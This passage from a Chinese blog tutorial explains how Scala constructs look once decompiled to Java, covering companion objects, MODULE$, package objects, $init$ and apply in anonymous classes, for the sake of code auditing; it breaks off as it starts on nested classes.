</span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">var</span> call: <span class="type">String</span> = <span class="string">&quot;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sayHello</span></span>(llac: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    println(llac)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> s: <span class="type">Singletons</span> = <span class="keyword">new</span> <span class="type">Singletons</span>()</span><br><span class="line">    <span class="comment">// 调用伴生类的私有属性</span></span><br><span class="line">    sayHello(s.llac)</span><br><span class="line">    <span class="comment">// 调用伴生类的私有方法</span></span><br><span class="line">    s.callSingleField()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面提供的代码中，被关键字<code>object</code>修饰的对象被称为类<code>Singletons</code>的伴生对象，类<code>Singletons</code> 被称为<code>object</code>关键字修饰的对象的伴生类，两者可互相调用其私有属性以及方法。<br><code>Scala</code>语言是运行在<code>jvm</code>上的，其最终编译结果符合<code>Java</code>字节码规范，于是便可以将其反编译成为<code>Java</code>代码进行查看，虽然这样会得到与<code>Scala</code>源代码迥然不同的代码结构并产生一些中间代码。审计者在进行<code>Scala</code>代码审计时大多数时候面对的都是被反编译成为<code>Java</code>代码的<code>Scala</code>程序，所以如何快速高效地识别<code>Scala</code>代码转换后的语言结构就尤为重要，特别是一些特殊的变量。<br>以下便是上文<code>Scala</code>源代码反编译成为<code>Java</code>代码后的形态  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singletons</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">String</span> <span class="variable">org$example$Singletons$$llac</span> <span class="operator">=</span> <span class="string">&quot;九敏啊，我是伴生类的私有属性，我被伴生对象调用了&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      Singletons$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(<span class="keyword">final</span> String llac)</span> &#123;</span><br><span class="line">      Singletons$.MODULE$.sayHello(llac);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String org$example$Singletons$$llac() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.org$example$Singletons$$llac;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> org$example$Singletons$$llac_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$llac = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> org$example$Singletons$$callSingleField() &#123;</span><br><span class="line">      .MODULE$.println(Singletons$.MODULE$.org$example$Singletons$$call());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from Singletons$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Singletons$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Singletons$ MODULE$;</span><br><span class="line">   <span class="keyword">private</span> String org$example$Singletons$$call;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Singletons$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String org$example$Singletons$$call() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.org$example$Singletons$$call;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> org$example$Singletons$$call_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(<span class="keyword">final</span> String llac)</span> &#123;</span><br><span class="line">      .MODULE$.println(llac);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Singletons</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singletons</span>();</span><br><span class="line">      <span class="built_in">this</span>.sayHello(s.org$example$Singletons$$llac());</span><br><span class="line">      s.org$example$Singletons$$callSingleField();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> Singletons$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = <span class="string">&quot;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">在反编译后的代码中，注解`<span class="meta">@ScalaSignature</span>`保存了`Scala`类的签名信息，包括类的类型参数、构造函数参数类型和返回类型等信息，这些信息对于代码审计并不会产生影响，直接无视即可。   </span><br><span class="line">在反编译后的代码中，产生了两个特殊的中间变量`MODULE$` 以及 `.MODULE$`，本节将介绍`MODULE$`变量，`.MODULE$`将在下节与包对象一节引出。  </span><br><span class="line">```java</span><br><span class="line"><span class="keyword">private</span> Singletons$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">      <span class="built_in">this</span>.org$example$Singletons$$call = <span class="string">&quot;九敏啊，我是伴生对象的私有属性，我被伴生类调用了&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>在伴生对象的私有构造方法中<code>MODULE$</code>被赋值为<code>this</code>，在<code>Java</code>中<code>this</code>表示当前对象实例的引用，即<code>this</code>乃<code>Singletons$</code>单例对象的引用。<br>伴生对象被称为伴生类的单例对象乃是通过静态代码块的方式实现。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Singletons$</span>();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>根据<code>jvm</code>类加载的原理（加载-&gt;链接-&gt;初始化），静态代码块的执行出现在初始化阶段<code>&lt;clinit&gt;()</code>，也就是说这部分代码在<code>jvm</code>的一次运行周期中只会被执行一次，即实现了单例对象的生成。</p>
<h3 id="包对象"><a href="#包对象" class="headerlink" title="包对象"></a>包对象</h3><blockquote>
<p>本节将介绍<code>.MODULE$</code>的含义   </p>
</blockquote>
<p>包对象允许在一个包中定义公共的方法、常量以及类型别名，以便在该包的所有 <code>Scala</code> 文件中共享和访问这些成员。如果你在使用<code>IDEA</code>进行审计时发现某个方法不能正常跳转，请到当前类的包目录下找到名为<code>package.class</code>的文件并尝试在其中找到该方法定义。<br>首先在<code>org.example</code>包下定义包对象  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> <span class="class"><span class="keyword">object</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">greetExample</span></span>(): <span class="type">String</span> = <span class="string">s&quot;你好, 我是org.example包!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在其子包<code>org.example.subPackage</code>中定义另一个包对象</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> <span class="class"><span class="keyword">object</span> <span class="title">subPackage</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">greetTest</span></span>(): <span class="type">String</span> = <span class="string">s&quot;你好, 我是org.example.subPackage包!&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着在<code>org.example</code>包下定义类<code>PackageObject</code>，该类定义了一个方法<code>packageGreet</code>分别从上述两处调用共享方法<code>greetExample</code>以及<code>greetTest</code></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subPackage.greetTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageObject</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">packageGreet</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">    greetExample()</span><br><span class="line">    greetTest()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以<code>org.example</code>下的包对象为例。在定义该包对象时使用了<code>object</code>关键字修饰，故可知包对象乃是伴生对象，在进行代码编译时会自动生成一个与之相关的伴生类，这也就是下面的代码中多出 <code>package</code> 类的原因。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from package.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">package</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">greetExample</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">package</span>$.MODULE$.greetExample();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from package$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">package$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">package</span>$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">package$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">greetExample</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;你好, 我是org.example包对象!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">package</span>$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PackageObject.class</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//decompiled from PackageObject.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.example.<span class="keyword">package</span>.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PackageObject</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">packageGreet</span><span class="params">()</span> &#123;</span><br><span class="line">      .MODULE$.greetExample();</span><br><span class="line">      org.example.testPackage.<span class="keyword">package</span>..MODULE$.greetTest();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察上文反编译代码，有两个问题需要回答。其一，<code>greetExample</code>这个方法来自哪里，为何通过<code>IDEA</code>不能进行索引跳转； 其二，<code>.MODULE$</code>到底是什么变量，为何在代码中没有任何的声明。<br>初看<code>.MODULE$.greetExample();</code>是一个有些奇怪的用法，语句竟然以<code>.</code>开头，不过如果将<code>import org.example.package.;</code>与之连接得到<code>org.example.package..MODULE$.greetExample();</code>，这样就与下一行中<code>org.example.testPackage.package..MODULE$.greetTest();</code>的调用方式一样，<br>于是情况似乎变得合理起来。<br>一个新的情况出现了，看如下代码：  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.<span class="type">Predef</span>.;</span><br><span class="line">.<span class="type">MODULE</span>$.println(<span class="string">&quot;我来自Predef伴生对象&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>在<code>Scala</code>包下，<code>Predef</code> 是一个伴生对象，但其并不是包对象，为何其也通过<code>.MODULE$</code>变量来引用方法。<br>其实包导入末尾的<code>.</code>表示导入当前对象中的所有静态成员，而<code>Predef</code>又是伴生对象，同时其<code>Module$</code>变量也是静态成员，加之在导入位置也可能存在静态成员<code>MODULE$</code> 故使用<code>.MODULE$</code>加以区分。<br>在后文<code>akka</code>框架一章，还将介绍该变量的另一种用法。</p>
<h3 id="初始化代码"><a href="#初始化代码" class="headerlink" title="初始化代码"></a>初始化代码</h3><blockquote>
<p>本节将涉及方法<code>$init$</code>的含义  </p>
</blockquote>
<p>有如下代码  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticCode</span></span>&#123;</span><br><span class="line">  println(<span class="string">&quot;我是类主体代码&quot;</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   print(<span class="string">&quot;我时初始化代码块&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> code = &#123;</span><br><span class="line">   print(<span class="string">&quot;我是变量初始化代码&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">StaticCode</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">var</span> sc: <span class="type">StaticCode</span> =  <span class="keyword">new</span> <span class="type">StaticCode</span>()</span><br><span class="line">    println(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其反编译为<code>Java</code>代码后，若其类主体、变量初始化代码、类初始化代码块中若存在较为复杂的逻辑，<code>Scala</code>编译器将自动生成名为<code>$init$</code>的方法。<br>另一种情况，若父类存在类主体，则类主体中的代码将被组合为<code>$init$</code>方法。  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Nested</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> s: <span class="type">String</span> = <span class="string">&quot;我是嵌套特质&quot;</span></span><br><span class="line">  println(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassNested</span> <span class="keyword">extends</span> <span class="title">Nested</span> </span>&#123;</span><br><span class="line">  println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反编译后结果如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.Predef.;</span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Nested</span> &#123;</span><br><span class="line">   String <span class="title function_">s</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">void</span> s_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> <span class="keyword">void</span> $init$(<span class="keyword">final</span> Nested $<span class="built_in">this</span>) &#123;</span><br><span class="line">      $<span class="built_in">this</span>.s_$eq(<span class="string">&quot;我是嵌套特质&quot;</span>);</span><br><span class="line">      .MODULE$.println($<span class="built_in">this</span>.s());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassNested</span> <span class="keyword">implements</span> <span class="title class_">Nested</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String s;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">s</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.s;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> s_$eq(<span class="keyword">final</span> String x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">this</span>.s = x$<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">ClassNested</span><span class="params">()</span> &#123;</span><br><span class="line">      Nested.$init$(<span class="built_in">this</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>ClassNested</code>的无参构造方法中调用了接口（特质）的<code>$init$</code>方法，而<code>$init$</code>方法则封装了特质的类主体逻辑。</p>
<h3 id="传参匿名类"><a href="#传参匿名类" class="headerlink" title="传参匿名类"></a>传参匿名类</h3><blockquote>
<p>本节将涉及<code>apply</code>方法</p>
</blockquote>
<p>以下是一个需要传参的匿名类  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">AnonymousClass</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">   <span class="comment">// runnable类型为Function1</span></span><br><span class="line">    <span class="keyword">val</span> runnable = <span class="keyword">new</span> (<span class="type">String</span> =&gt; <span class="type">Unit</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> name: <span class="type">String</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">      <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">apply</span></span>(name: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">whoami</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">        println(name)</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// 使用Function1 类的注入器进行传参</span></span><br><span class="line">    runnable(<span class="string">&quot;alis&quot;</span>)</span><br><span class="line">    <span class="comment">// 调用方法</span></span><br><span class="line">    runnable.whoami()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>反编译后的代码如下  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousClass.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scala.reflect.ScalaSignature;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ScalaSignature(</span></span><br><span class="line"><span class="meta">   bytes = &quot;ignored&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousClass</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      AnonymousClass$.MODULE$.main(args);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//decompiled from AnonymousClass$.class</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> scala.Function1;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.BoxedUnit;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.StructuralCallSite;</span><br><span class="line"><span class="keyword">import</span> scala.runtime.ScalaRunTime.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">AnonymousClass$</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> AnonymousClass$ MODULE$;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">static</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">AnonymousClass$</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Method reflMethod$Method1(<span class="keyword">final</span> Class x$<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="type">StructuralCallSite</span> <span class="variable">methodCache1</span> <span class="operator">=</span> apply&lt;invokedynamic&gt;();</span><br><span class="line">      <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> methodCache1.find(x$<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (method1 != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         method1 = .MODULE$.ensureAccessible(x$<span class="number">1.</span>getMethod(<span class="string">&quot;whoami&quot;</span>, methodCache1.parameterTypes()));</span><br><span class="line">         methodCache1.add(x$<span class="number">1</span>, method1);</span><br><span class="line">         <span class="keyword">return</span> method1;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Function1</span> <span class="variable">runnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Function1</span>() &#123;</span><br><span class="line">         <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// $FF: synthetic method</span></span><br><span class="line">         <span class="comment">// $FF: bridge method</span></span><br><span class="line">         ...</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(<span class="keyword">final</span> String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name_$eq(name);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whoami</span><span class="params">()</span> &#123;</span><br><span class="line">            scala.Predef..MODULE$.println(<span class="built_in">this</span>.name());</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// $FF: synthetic method</span></span><br><span class="line">         <span class="comment">// $FF: bridge method</span></span><br><span class="line">         <span class="keyword">public</span> Object <span class="title function_">apply</span><span class="params">(<span class="keyword">final</span> Object v1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.apply((String)v1);</span><br><span class="line">            <span class="keyword">return</span> BoxedUnit.UNIT;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> &#123;</span><br><span class="line">            <span class="comment">// 上节提到的$init$方法 完成对象的初始化操作</span></span><br><span class="line">            Function1.$init$(<span class="built_in">this</span>);</span><br><span class="line">            <span class="built_in">this</span>.name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      runnable.apply(<span class="string">&quot;alis&quot;</span>);</span><br><span class="line">      <span class="type">Function1</span> <span class="variable">qual1</span> <span class="operator">=</span> runnable;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         reflMethod$Method1(qual1.getClass()).invoke(qual1);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InvocationTargetException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> var5.getCause();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">BoxedUnit</span> <span class="variable">var10000</span> <span class="operator">=</span> BoxedUnit.UNIT;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> AnonymousClass$() &#123;</span><br><span class="line">      MODULE$ = <span class="built_in">this</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在伴生对象的<code>main</code>方法中，首先构造了一个<code>Function1</code>类型的匿名类对象<code>runnable</code>，创建匿名类后调用其<code>apply</code>方法（注入器）进行传参，如此便完成了有参匿名类的实例化，然后通过反射进行方法调用。匿名类、匿名函数的传参、调用大量使用了<code>apply</code>方法，要加以甄别。</p>
<h3 id="类嵌套"><a href="#类嵌套" class="headerlink" title="类嵌套"></a>类嵌套</h3><blockquote>
<p>本节将涉及变量<code>$outer</code>的含义  </p>
</blockquote>
<p>有如下代码定义匿名类<code>a</code>，其中嵌套匿名类<code>b</code>，在嵌套匿名类<code>b</code>中调用外部类<code>a</code>的方法。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">AnonymousNested</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> a =<span class="keyword">new</span> <span class="type">Object</span> &#123;</span><br><span class="line">      <span class="keyword">val</span> b = <span class="keyword">new</span> <span class="type">Object</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">printHelloNested</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">          printHello()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">printHello</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">        println(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    a.b.printHelloNested()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上文代码反编译为<code>Java</code>代码</p>
